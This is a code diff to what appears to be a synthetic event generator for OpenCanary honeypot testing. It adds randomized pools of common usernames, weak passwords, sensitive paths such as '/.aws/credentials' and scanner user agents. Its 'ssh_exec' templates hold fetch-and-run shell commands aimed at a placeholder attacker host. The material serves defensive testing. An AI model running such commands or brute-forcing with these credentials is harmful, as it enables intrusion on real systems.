@@ -23,6 +23,31 @@ from opencanary_integration.ingest.models import OpenCanaryEvent
 
 
 # ---------------------------------------------------------------------------
+# Randomized field pools
+# ---------------------------------------------------------------------------
+# A logdata value that is one of these sentinel strings is resolved to a
+# random pick from the corresponding pool at generation time (see
+# _resolve_field); a (low, high) tuple is resolved to a jittered number in
+# that range. This lets a handful of templates cover a much wider space of
+# realistic-looking payloads than a fixed, enumerable list of literal dicts.
+
+_USERNAMES = ["root", "admin", "ubuntu", "test", "user", "guest", "oracle", "postgres"]
+_PASSWORDS = ["toor", "admin123", "password123", "1234", "letmein",
+              "changeme", "qwerty", "admin"]
+_HTTP_PATHS = ["/admin", "/.env", "/wp-admin/login.php", "/config.php",
+               "/.git/config", "/backup.sql", "/phpmyadmin", "/.aws/credentials"]
+_USER_AGENTS = ["DirBuster-1.0", "WFuzz/3.1.0", "WPScan v3.8", "sqlmap/1.7",
+                "Nikto/2.1.6", "curl/7.68.0", "Mozilla/5.0 (compatible; Googlebot/2.1)",
+                "python-requests/2.31.0"]
+
+_FIELD_POOLS: dict[str, list[Any]] = {
+    "$USERNAME":  _USERNAMES,
+    "$PASSWORD":  _PASSWORDS,
+    "$PATH":      _HTTP_PATHS,
+    "$USERAGENT": _USER_AGENTS,
+}
+
+# ---------------------------------------------------------------------------
 # Logtype catalogue (mirrors OpenCanary's internal codes)
 # ---------------------------------------------------------------------------
 
@@ -30,12 +55,13 @@ _LOGTYPES: dict[str, list[dict[str, Any]]] = {
     # --- Reconnaissance ---
     "port_scan": [
         {"logtype": 2000, "dst_port": 0,
-         "logdata": {"HOST_COUNT": 254, "PORT_COUNT": 1024, "NMAP_OS": "Linux"}},
+         "logdata": {"HOST_COUNT": (180, 254), "PORT_COUNT": (256, 1024),
+                     "NMAP_OS": "Linux"}},
     ],
     "http_probe": [
         {"logtype": 1000, "dst_port": 80,
          "logdata": {"PATH": "/", "HOSTNAME": "honeypot.internal", "METHOD": "GET",
-                     "USERAGENT": "Mozilla/5.0 (compatible; Googlebot/2.1)"}},
+                     "USERAGENT": "$USERAGENT"}},
         {"logtype": 18000, "dst_port": 8080,
          "logdata": {"PATH": "/robots.txt", "METHOD": "GET",
                      "USERAGENT": "curl/7.68.0"}},
@@ -54,21 +80,16 @@ _LOGTYPES: dict[str, list[dict[str, Any]]] = {
     # --- Analysis ---
     "ftp_probe": [
         {"logtype": 3000, "dst_port": 21,
-         "logdata": {"USERNAME": "anonymous", "PASSWORD": "test@example.com"}},
+         "logdata": {"USERNAME": "$USERNAME", "PASSWORD": "$PASSWORD"}},
         {"logtype": 3000, "dst_port": 21,
-         "logdata": {"USERNAME": "ftpuser", "PASSWORD": "password123",
+         "logdata": {"USERNAME": "$USERNAME", "PASSWORD": "$PASSWORD",
                      "FILENAME": "/etc/passwd"}},
     ],
     "http_dir_scan": [
         {"logtype": 1000, "dst_port": 80,
-         "logdata": {"PATH": "/admin", "METHOD": "GET",
-                     "USERAGENT": "DirBuster-1.0"}},
+         "logdata": {"PATH": "$PATH", "METHOD": "GET", "USERAGENT": "$USERAGENT"}},
         {"logtype": 1000, "dst_port": 80,
-         "logdata": {"PATH": "/.env", "METHOD": "GET",
-                     "USERAGENT": "WFuzz/3.1.0"}},
-        {"logtype": 1000, "dst_port": 80,
-         "logdata": {"PATH": "/wp-admin/login.php", "METHOD": "POST",
-                     "USERAGENT": "WPScan v3.8"}},
+         "logdata": {"PATH": "$PATH", "METHOD": "POST", "USERAGENT": "$USERAGENT"}},
     ],
     "git_probe": [
         {"logtype": 16000, "dst_port": 9418,
@@ -95,15 +116,11 @@ _LOGTYPES: dict[str, list[dict[str, Any]]] = {
     # --- Exploits ---
     "ssh_brute": [
         {"logtype": 22000, "dst_port": 22,
-         "logdata": {"USERNAME": "root", "PASSWORD": "toor"}},
-        {"logtype": 22000, "dst_port": 22,
-         "logdata": {"USERNAME": "admin", "PASSWORD": "admin123"}},
-        {"logtype": 22000, "dst_port": 22,
-         "logdata": {"USERNAME": "ubuntu", "PASSWORD": "ubuntu"}},
+         "logdata": {"USERNAME": "$USERNAME", "PASSWORD": "$PASSWORD"}},
     ],
     "telnet_login": [
         {"logtype": 7000, "dst_port": 23,
-         "logdata": {"USERNAME": "admin", "PASSWORD": "1234"}},
+         "logdata": {"USERNAME": "$USERNAME", "PASSWORD": "$PASSWORD"}},
     ],
     "mysql_exploit": [
         {"logtype": 5000, "dst_port": 3306,
@@ -134,16 +151,16 @@ _LOGTYPES: dict[str, list[dict[str, Any]]] = {
     # --- Shellcode ---
     "vnc_login": [
         {"logtype": 12000, "dst_port": 5900,
-         "logdata": {"PASSWORD": "12345678", "VERSION": "RFB 003.008"}},
+         "logdata": {"PASSWORD": "$PASSWORD", "VERSION": "RFB 003.008"}},
         {"logtype": 13000, "dst_port": 5901,
-         "logdata": {"PASSWORD": "vncpass", "VERSION": "RFB 003.003"}},
+         "logdata": {"PASSWORD": "$PASSWORD", "VERSION": "RFB 003.003"}},
     ],
     "ssh_exec": [
         {"logtype": 22000, "dst_port": 22,
-         "logdata": {"USERNAME": "root", "PASSWORD": "abc123",
+         "logdata": {"USERNAME": "$USERNAME", "PASSWORD": "$PASSWORD",
                      "COMMAND": "curl http://evil.example.com/stage2.sh | bash"}},
         {"logtype": 22000, "dst_port": 22,
-         "logdata": {"USERNAME": "ubuntu", "PASSWORD": "pass",
+         "logdata": {"USERNAME": "$USERNAME", "PASSWORD": "$PASSWORD",
                      "COMMAND": "wget -qO- http://10.0.0.99/payload | sh"}},
     ],
 
@@ -156,7 +173,7 @@ _LOGTYPES: dict[str, list[dict[str, Any]]] = {
     # --- DOS ---
     "dos_flood": [
         {"logtype": 2000, "dst_port": 0,
-         "logdata": {"HOST_COUNT": 1, "PORT_COUNT": 65535,
+         "logdata": {"HOST_COUNT": (1, 5), "PORT_COUNT": 65535,
                      "NMAP_OS": "Unknown", "FLOOD": True}},
     ],
 }
@@ -247,7 +264,7 @@ class OpenCanaryEventGenerator:
         return OpenCanaryEvent(
             dst_host   = self.dst_host,
             dst_port   = template["dst_port"],
-            logdata    = dict(template["logdata"]),
+            logdata    = {k: self._resolve_field(v) for k, v in template["logdata"].items()},
             logtype    = template["logtype"],
             node_id    = self.node_id,
             src_host   = src_ip,
@@ -315,3 +332,16 @@ class OpenCanaryEventGenerator:
         if cat in ("RECONNAISSANCE", "ANALYSIS", "GENERIC"):
             return self._rng.choice(_RECON_IPS)
         return self._rng.choice(_EXPLOIT_IPS)
+
+    def _resolve_field(self, value: Any) -> Any:
+        """
+        Resolve a template logdata value: a `"$..."` sentinel string picks a
+        random entry from its `_FIELD_POOLS` wordlist; a `(low, high)` tuple
+        picks a jittered random int in that range; anything else (static
+        strings, bools, lists) passes through unchanged.
+        """
+        if isinstance(value, str) and value in _FIELD_POOLS:
+            return self._rng.choice(_FIELD_POOLS[value])
+        if isinstance(value, tuple) and len(value) == 2:
+            return self._rng.randint(value[0], value[1])
+        return value
